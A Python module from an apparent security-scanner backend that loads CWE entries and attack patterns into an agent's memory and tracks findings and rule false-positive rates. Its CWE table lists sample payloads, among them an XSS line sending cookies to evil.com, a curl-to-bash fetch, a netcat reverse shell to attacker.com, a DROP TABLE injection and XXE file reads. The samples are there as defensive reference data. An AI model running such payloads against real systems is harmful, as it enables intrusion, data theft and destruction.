"""
backend/memory/knowledge_base.py — TythanAI high-level knowledge management.

KnowledgeBase wraps MemoryManager to provide:
  - Pre-loaded CWE / attack-pattern knowledge (no external API)
  - Confirmed-finding storage with verdict tracking
  - Rule-level FP statistics
  - Scan episode persistence and summarisation
"""
from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional

from backend.memory.memory_manager import MemoryManager, MemorySearchResult

logger = logging.getLogger("tythanai.knowledge_base")

# ---------------------------------------------------------------------------
# Embedded CWE knowledge — no external calls required
# ---------------------------------------------------------------------------

_CWE_KNOWLEDGE: Dict[str, Dict[str, Any]] = {
    "CWE-89": {
        "name": "SQL Injection",
        "description": (
            "Improper neutralisation of special elements used in an SQL command. "
            "Allows attackers to interfere with queries made to the database, "
            "potentially reading, modifying or deleting data."
        ),
        "attack_examples": [
            "SELECT * FROM users WHERE id='' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM admins--",
        ],
        "mitre_ids": ["T1190"],
        "severity": "CRITICAL",
    },
    "CWE-79": {
        "name": "Cross-Site Scripting (XSS)",
        "description": (
            "Improper neutralisation of input during web-page generation allows "
            "attackers to inject client-side scripts into pages viewed by other users, "
            "potentially hijacking sessions or redirecting users."
        ),
        "attack_examples": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('https://evil.com/'+document.cookie)>",
            "javascript:eval(atob('YWxlcnQoMSk='))",
        ],
        "mitre_ids": ["T1059.007"],
        "severity": "HIGH",
    },
    "CWE-78": {
        "name": "OS Command Injection",
        "description": (
            "Improper neutralisation of special elements used in an OS command. "
            "Attackers can execute arbitrary commands on the host operating system "
            "via a vulnerable application."
        ),
        "attack_examples": [
            "ls; cat /etc/passwd",
            "$(curl http://evil.com/shell.sh | bash)",
            "| nc attacker.com 4444 -e /bin/sh",
        ],
        "mitre_ids": ["T1059"],
        "severity": "CRITICAL",
    },
    "CWE-22": {
        "name": "Path Traversal",
        "description": (
            "Improper limitation of a pathname to a restricted directory allows "
            "attackers to access files outside the intended directory using sequences "
            "such as '../'."
        ),
        "attack_examples": [
            "../../etc/passwd",
            "..%2F..%2Fetc%2Fshadow",
            "%2e%2e%2f%2e%2e%2fetc/hosts",
        ],
        "mitre_ids": ["T1083"],
        "severity": "HIGH",
    },
    "CWE-20": {
        "name": "Improper Input Validation",
        "description": (
            "The product does not validate or incorrectly validates input that can "
            "affect the control flow or data flow of a program. Serves as a root "
            "cause for many other weaknesses."
        ),
        "attack_examples": [
            "Negative array index bypass",
            "Integer overflow via unsanitised form field",
            "Null-byte injection to truncate file path",
        ],
        "mitre_ids": ["T1190"],
        "severity": "MEDIUM",
    },
    "CWE-200": {
        "name": "Exposure of Sensitive Information",
        "description": (
            "The product exposes sensitive information to actors without the proper "
            "authorisation, including stack traces, internal paths, credentials, or "
            "personal data in error messages or logs."
        ),
        "attack_examples": [
            "Verbose error page disclosing database schema",
            "Stack trace containing absolute server path",
            "API response leaking user PII",
        ],
        "mitre_ids": ["T1213"],
        "severity": "MEDIUM",
    },
    "CWE-306": {
        "name": "Missing Authentication for Critical Function",
        "description": (
            "The software does not perform any authentication for functionality that "
            "requires a provable user identity, leaving critical operations accessible "
            "to unauthenticated actors."
        ),
        "attack_examples": [
            "Admin endpoint without auth middleware",
            "Password-reset without email verification",
            "Direct object access without session check",
        ],
        "mitre_ids": ["T1078"],
        "severity": "CRITICAL",
    },
    "CWE-327": {
        "name": "Use of Broken or Risky Cryptographic Algorithm",
        "description": (
            "The use of a broken or risky cryptographic algorithm introduces "
            "vulnerabilities that may allow attackers to decrypt or forge data. "
            "Includes MD5, SHA-1 for integrity, DES, RC4."
        ),
        "attack_examples": [
            "MD5 password hashing",
            "DES-encrypted session tokens",
            "SHA-1 HMAC for JWT signature",
        ],
        "mitre_ids": ["T1600"],
        "severity": "HIGH",
    },
    "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": (
            "Deserialising data from an untrusted source without validation can allow "
            "attackers to execute arbitrary code, escalate privileges, or cause denial "
            "of service via crafted serialised objects."
        ),
        "attack_examples": [
            "pickle.loads(user_input)",
            "yaml.load() without Loader=yaml.SafeLoader",
            "Java ObjectInputStream with gadget chains",
        ],
        "mitre_ids": ["T1059"],
        "severity": "CRITICAL",
    },
    "CWE-798": {
        "name": "Use of Hard-coded Credentials",
        "description": (
            "The software contains hard-coded credentials such as passwords or "
            "cryptographic keys. Attackers who obtain the source code can easily "
            "authenticate or decrypt protected data."
        ),
        "attack_examples": [
            'password = "admin123"  # hard-coded',
            'API_KEY = "sk-live-abc123def456"',
            "RSA private key embedded in source file",
        ],
        "mitre_ids": ["T1552.001"],
        "severity": "CRITICAL",
    },
    "CWE-611": {
        "name": "XML External Entity (XXE) Injection",
        "description": (
            "Improper restriction of XML external entity references allows attackers "
            "to read arbitrary files, perform SSRF, or conduct DoS attacks via "
            "crafted XML input."
        ),
        "attack_examples": [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY ssrf SYSTEM 'http://169.254.169.254/latest/meta-data/'>",
            "Billion laughs entity expansion DoS",
        ],
        "mitre_ids": ["T1190"],
        "severity": "HIGH",
    },
    "CWE-94": {
        "name": "Code Injection",
        "description": (
            "Allows attackers to inject and execute arbitrary code by exploiting "
            "insecure use of eval(), exec(), or similar dynamic execution functions "
            "with unsanitised user-controlled input."
        ),
        "attack_examples": [
            "eval(request.GET['expr'])",
            "exec(compile(user_code, '<string>', 'exec'))",
            "__import__('os').system('id')",
        ],
        "mitre_ids": ["T1059"],
        "severity": "CRITICAL",
    },
    "CWE-190": {
        "name": "Integer Overflow or Wraparound",
        "description": (
            "Integer overflow or wraparound occurs when an arithmetic operation "
            "produces a result too large to be stored, causing unexpected truncation "
            "that leads to buffer overflows or logic errors."
        ),
        "attack_examples": [
            "size_t n = len + 1 overflows to 0 on 32-bit",
            "int multiplication overflow bypasses length check",
            "Unsigned integer wraps allowing heap underflow",
        ],
        "mitre_ids": ["T1203"],
        "severity": "HIGH",
    },
    "CWE-416": {
        "name": "Use After Free",
        "description": (
            "Referencing memory after it has been freed can cause a program to crash, "
            "use unexpected values, or execute code, leading to privilege escalation "
            "or arbitrary code execution."
        ),
        "attack_examples": [
            "Browser UAF in DOM event handling",
            "Kernel object reuse after kfree()",
            "Dangling pointer dereference in C++ vtable",
        ],
        "mitre_ids": ["T1203"],
        "severity": "CRITICAL",
    },
    "CWE-362": {
        "name": "Race Condition",
        "description": (
            "Concurrent execution of code without proper synchronisation on a shared "
            "resource can lead to privilege escalation, data corruption, or security "
            "bypass (TOCTOU — time-of-check/time-of-use)."
        ),
        "attack_examples": [
            "TOCTOU: check file permissions then open",
            "Double-fetch vulnerability in kernel ioctl",
            "Concurrent increment of non-atomic counter",
        ],
        "mitre_ids": ["T1548"],
        "severity": "HIGH",
    },
    "CWE-476": {
        "name": "NULL Pointer Dereference",
        "description": (
            "Dereferencing a null pointer causes the application to crash (DoS). "
            "In some environments it can lead to arbitrary code execution if the "
            "null-page is mapped."
        ),
        "attack_examples": [
            "ptr = malloc(0); *ptr = value;",
            "Object method call on uninitialised pointer",
            "Return-value not checked before use",
        ],
        "mitre_ids": ["T1499"],
        "severity": "MEDIUM",
    },
    "CWE-787": {
        "name": "Out-of-bounds Write",
        "description": (
            "Writing data past the end or before the beginning of a buffer allows "
            "attackers to corrupt data, crash the program, or execute arbitrary code."
        ),
        "attack_examples": [
            "strcpy(buf, user_input) without length check",
            "Heap overflow via crafted PNG chunk length",
            "Stack smashing via gets()",
        ],
        "mitre_ids": ["T1203"],
        "severity": "CRITICAL",
    },
    "CWE-285": {
        "name": "Improper Authorization",
        "description": (
            "The software does not perform or incorrectly performs an authorisation "
            "check when an actor attempts to access a resource or perform an action, "
            "allowing privilege escalation or IDOR."
        ),
        "attack_examples": [
            "IDOR: /api/users/42/data accessible without ownership check",
            "Horizontal privilege escalation via manipulated user_id",
            "Admin action accessible to regular user role",
        ],
        "mitre_ids": ["T1078"],
        "severity": "HIGH",
    },
    "CWE-319": {
        "name": "Cleartext Transmission of Sensitive Information",
        "description": (
            "Transmitting sensitive data (credentials, session tokens, PII) over an "
            "unencrypted channel exposes it to interception by network eavesdroppers."
        ),
        "attack_examples": [
            "HTTP Basic Auth without TLS",
            "FTP password transmitted in plaintext",
            "WebSocket without wss:// for auth tokens",
        ],
        "mitre_ids": ["T1040"],
        "severity": "HIGH",
    },
    "CWE-352": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "description": (
            "Forces an authenticated user's browser to execute unwanted actions on a "
            "web application, exploiting the trust the application places in the "
            "user's browser without a CSRF token."
        ),
        "attack_examples": [
            "<form action='https://bank.com/transfer' method='POST'>",
            "<img src='https://target.com/delete?id=1'>",
            "fetch() cross-origin state-change without CSRF header",
        ],
        "mitre_ids": ["T1185"],
        "severity": "HIGH",
    },
}

# ---------------------------------------------------------------------------
# Pre-loaded attack patterns
# ---------------------------------------------------------------------------

_ATTACK_PATTERNS: List[Dict[str, str]] = [
    {
        "name": "SQL Injection",
        "description": "Injecting SQL into database queries to extract, modify, or delete data.",
        "mitre_id": "T1190",
        "severity": "CRITICAL",
    },
    {
        "name": "Command Injection",
        "description": "Executing arbitrary OS commands via unsanitised shell invocations.",
        "mitre_id": "T1059",
        "severity": "CRITICAL",
    },
    {
        "name": "Path Traversal",
        "description": "Traversing directory structure to access restricted files with '../' sequences.",
        "mitre_id": "T1083",
        "severity": "HIGH",
    },
    {
        "name": "Cross-Site Scripting",
        "description": "Injecting malicious scripts into web pages viewed by other users.",
        "mitre_id": "T1059.007",
        "severity": "HIGH",
    },
    {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Inducing the server to make HTTP requests to internal or external resources.",
        "mitre_id": "T1090",
        "severity": "HIGH",
    },
    {
        "name": "Insecure Deserialization",
        "description": "Exploiting object deserialisation to achieve RCE via gadget chains.",
        "mitre_id": "T1059",
        "severity": "CRITICAL",
    },
    {
        "name": "Broken Authentication",
        "description": "Exploiting weak session management or credential handling to impersonate users.",
        "mitre_id": "T1078",
        "severity": "CRITICAL",
    },
    {
        "name": "XML External Entity (XXE)",
        "description": "Abusing XML parsers to read local files or probe internal network services.",
        "mitre_id": "T1190",
        "severity": "HIGH",
    },
    {
        "name": "Credential Stuffing",
        "description": "Using breached credential lists against authentication endpoints.",
        "mitre_id": "T1110.004",
        "severity": "HIGH",
    },
    {
        "name": "Privilege Escalation via SUID Binary",
        "description": "Abusing SUID/SGID binaries to gain elevated OS privileges.",
        "mitre_id": "T1548.001",
        "severity": "HIGH",
    },
    {
        "name": "JWT Algorithm Confusion",
        "description": "Switching JWT signing algorithm (e.g., RS256 → HS256) to forge tokens.",
        "mitre_id": "T1078",
        "severity": "CRITICAL",
    },
    {
        "name": "Race Condition / TOCTOU",
        "description": "Exploiting time gaps between permission checks and resource access.",
        "mitre_id": "T1548",
        "severity": "HIGH",
    },
    {
        "name": "Mass Assignment",
        "description": "Overriding model attributes via bulk-assignment of user-supplied fields.",
        "mitre_id": "T1190",
        "severity": "HIGH",
    },
    {
        "name": "Open Redirect",
        "description": "Redirecting users to attacker-controlled URLs via unvalidated redirect parameters.",
        "mitre_id": "T1192",
        "severity": "MEDIUM",
    },
    {
        "name": "Prototype Pollution",
        "description": "Injecting properties into JavaScript Object prototype to alter application logic.",
        "mitre_id": "T1059.007",
        "severity": "HIGH",
    },
    {
        "name": "Heap Buffer Overflow",
        "description": "Writing beyond heap buffer boundaries to corrupt metadata or hijack control flow.",
        "mitre_id": "T1203",
        "severity": "CRITICAL",
    },
    {
        "name": "Integer Overflow to Buffer Overflow",
        "description": "Integer truncation during size calculation leading to under-allocated buffers.",
        "mitre_id": "T1203",
        "severity": "HIGH",
    },
    {
        "name": "Hard-coded Secret Exposure",
        "description": "Embedding API keys, passwords, or private keys directly in source code.",
        "mitre_id": "T1552.001",
        "severity": "CRITICAL",
    },
    {
        "name": "Cleartext Credential Transmission",
        "description": "Transmitting authentication data over unencrypted HTTP channels.",
        "mitre_id": "T1040",
        "severity": "HIGH",
    },
    {
        "name": "Dependency Confusion",
        "description": "Publishing malicious packages with internal package names to public registries.",
        "mitre_id": "T1195.001",
        "severity": "HIGH",
    },
]


# ---------------------------------------------------------------------------
# Rule statistics (in-memory; can be extended to persist via DB)
# ---------------------------------------------------------------------------

class _RuleStats:
    """Per-rule hit count and false-positive tracker (in-memory)."""

    def __init__(self) -> None:
        self._data: Dict[str, Dict[str, int]] = {}

    def update(self, rule_id: str, hit: bool, is_fp: bool) -> None:
        if rule_id not in self._data:
            self._data[rule_id] = {"hit_count": 0, "fp_count": 0}
        if hit:
            self._data[rule_id]["hit_count"] += 1
        if is_fp:
            self._data[rule_id]["fp_count"] += 1

    def get(self, rule_id: str) -> Dict[str, Any]:
        d = self._data.get(rule_id, {"hit_count": 0, "fp_count": 0})
        hit = d["hit_count"]
        fp = d["fp_count"]
        fp_rate = round(fp / hit, 4) if hit > 0 else 0.0
        return {"hit_count": hit, "fp_count": fp, "fp_rate": fp_rate}


# ---------------------------------------------------------------------------
# KnowledgeBase
# ---------------------------------------------------------------------------

class KnowledgeBase:
    """
    High-level knowledge management built on top of MemoryManager.

    Responsibilities:
      - Pre-loading 20 CWE knowledge entries and 20 attack patterns on first init
      - Storing and retrieving confirmed findings with verdicts
      - Tracking per-rule FP statistics
      - Persisting scan episodes
      - Providing full retrieval context before an agent decision
    """

    def __init__(self, memory_manager: MemoryManager) -> None:
        self._memory = memory_manager
        self._initialized = False
        self._rule_stats = _RuleStats()

    # ------------------------------------------------------------------
    # Initialization
    # ------------------------------------------------------------------

    def initialize(self) -> None:
        """
        Load CWE knowledge and attack patterns into semantic memory.
        Idempotent — calling twice does not duplicate entries (uses stable IDs).
        """
        if self._initialized:
            return

        for cwe_id, info in _CWE_KNOWLEDGE.items():
            entry_id = f"cwe_{cwe_id}"
            description = f"{info['name']}: {info['description']}"
            try:
                self._memory._store(
                    layer=MemoryManager._SEMANTIC_LAYER,
                    content=(
                        f"CWE: {cwe_id} | Name: {info['name']} | "
                        f"Severity: {info['severity']} | {info['description']} | "
                        f"Examples: {' | '.join(info['attack_examples'])}"
                    ),
                    metadata={
                        "cwe_id": cwe_id,
                        "name": info["name"],
                        "severity": info["severity"],
                        "mitre_ids": ",".join(info["mitre_ids"]),
                        "description": info["description"][:800],
                        "attack_examples": info["attack_examples"][:3],
                        "entry_kind": "cwe_knowledge",
                    },
                    memory_type="knowledge",
                    entry_id=entry_id,
                )
            except Exception as exc:
                logger.warning("Failed to store CWE %s: %s", cwe_id, exc)

        for i, pattern in enumerate(_ATTACK_PATTERNS):
            # Use a stable, deterministic entry_id so re-initialisation is idempotent
            safe_name = pattern["name"].lower().replace(" ", "_").replace("(", "").replace(")", "").replace("/", "_")
            entry_id = f"ap_{i}_{safe_name}"
            content = (
                f"Attack Pattern: {pattern['name']} | MITRE: {pattern['mitre_id']} | "
                f"Severity: {pattern['severity']} | Description: {pattern['description']}"
            )
            meta = {
                "name": pattern["name"],
                "mitre_id": pattern["mitre_id"],
                "severity": pattern["severity"],
                "description": pattern["description"][:1000],
                "entry_kind": "attack_pattern",
            }
            try:
                self._memory._store(
                    layer=MemoryManager._SEMANTIC_LAYER,
                    content=content,
                    metadata=meta,
                    memory_type="pattern",
                    entry_id=entry_id,
                )
            except Exception as exc:
                logger.warning("Failed to store attack pattern %s: %s", pattern["name"], exc)

        self._initialized = True
        logger.info(
            "KnowledgeBase initialised: %d CWEs, %d attack patterns",
            len(_CWE_KNOWLEDGE),
            len(_ATTACK_PATTERNS),
        )

    # ------------------------------------------------------------------
    # Confirmed findings
    # ------------------------------------------------------------------

    def add_confirmed_finding(
        self,
        finding: Any,
        verdict: str,
        code_context: str = "",
    ) -> None:
        """
        Store a confirmed finding (verdict='tp' or 'fp') into long-term memory.
        Also records a fix pattern if the verdict indicates a true positive.
        """
        self._memory.store_finding(finding, verdict, session_id="confirmed")
        if verdict.lower() in ("tp", "true_positive") and code_context:
            self._memory.store_successful_fix(
                rule_id=finding.rule_id,
                fix_description=f"Confirmed TP for {finding.rule_id} at {finding.file}:{finding.line}",
                before_code=code_context,
                after_code="[remediation required]",
            )

    # ------------------------------------------------------------------
    # Context retrieval before decision
    # ------------------------------------------------------------------

    def retrieve_context_for_finding(self, finding: Any) -> Dict[str, Any]:
        """
        Retrieve relevant knowledge before evaluating a finding.

        Returns a dict with keys:
          similar_findings  — past findings with same/similar rule
          cwe_knowledge     — CWE entry from semantic memory
          attack_patterns   — matching MITRE patterns
          similar_fixes     — past successful fixes for the rule
        """
        query = (
            f"{finding.rule_id} {finding.severity} {finding.cwe_id} "
            f"{finding.description} {finding.file}"
        )

        similar_findings = self._memory.retrieve_similar_findings(finding, top_k=5)

        cwe_query = f"{finding.cwe_id} {finding.description}"
        cwe_results = self._memory.retrieve_knowledge(cwe_query, top_k=3)
        # Build a structured CWE dict from the best match
        cwe_knowledge: Dict[str, Any] = {}
        if cwe_results:
            best = cwe_results[0].entry
            cwe_knowledge = {
                "cwe_id": best.metadata.get("cwe_id", finding.cwe_id),
                "name": best.metadata.get("name", ""),
                "description": best.metadata.get("description", best.content),
                "severity": best.metadata.get("severity", finding.severity),
                "examples": best.metadata.get("attack_examples", []),
                "score": cwe_results[0].score,
            }

        attack_patterns = self._memory.retrieve_attack_patterns(query, top_k=3)
        similar_fixes = self._memory.retrieve_similar_fixes(
            rule_id=finding.rule_id,
            code_snippet=finding.description,
            top_k=3,
        )

        return {
            "similar_findings": similar_findings,
            "cwe_knowledge": cwe_knowledge,
            "attack_patterns": attack_patterns,
            "similar_fixes": similar_fixes,
        }

    # ------------------------------------------------------------------
    # Rule statistics
    # ------------------------------------------------------------------

    def update_rule_stats(self, rule_id: str, hit: bool, is_fp: bool) -> None:
        """Track rule hit count and false-positive rate."""
        self._rule_stats.update(rule_id, hit=hit, is_fp=is_fp)

    def get_rule_stats(self, rule_id: str) -> Dict[str, Any]:
        """Return hit_count, fp_count, fp_rate for a rule."""
        return self._rule_stats.get(rule_id)

    # ------------------------------------------------------------------
    # Scan results
    # ------------------------------------------------------------------

    def add_scan_result(
        self,
        scan_id: str,
        findings: List[Any],
        fp_count: int,
    ) -> None:
        """Persist a scan episode into episodic memory."""
        total = len(findings)
        critical = sum(1 for f in findings if f.severity == "CRITICAL")
        high = sum(1 for f in findings if f.severity == "HIGH")
        summary = {
            "total_findings": total,
            "critical_count": critical,
            "high_count": high,
            "fp_count": fp_count,
            "tp_count": total - fp_count,
        }
        self._memory.store_scan_summary(scan_id, summary)
        self._memory.store_episode(
            scan_id=scan_id,
            action="scan_completed",
            reasoning=f"Completed scan with {total} findings ({fp_count} FP)",
            outcome=f"critical={critical} high={high} fp={fp_count}",
        )

    # ------------------------------------------------------------------
    # Statistics
    # ------------------------------------------------------------------

    def get_knowledge_stats(self) -> Dict[str, Any]:
        """Return counts: cwe_entries, patterns, confirmed_findings, scan_episodes."""
        mem_stats = self._memory.get_stats()
        semantic_count = mem_stats.get(MemoryManager._SEMANTIC_LAYER, 0)
        long_term_count = mem_stats.get(MemoryManager._LONG_TERM_LAYER, 0)
        episodic_count = mem_stats.get(MemoryManager._EPISODIC_LAYER, 0)

        # Distinguish CWE entries from attack patterns within semantic layer
        cwe_count = len(_CWE_KNOWLEDGE)
        pattern_count = len(_ATTACK_PATTERNS)

        return {
            "cwe_entries": cwe_count,
            "patterns": pattern_count,
            "confirmed_findings": long_term_count,
            "scan_episodes": episodic_count,
            "semantic_total": semantic_count,
            "initialized": self._initialized,
        }
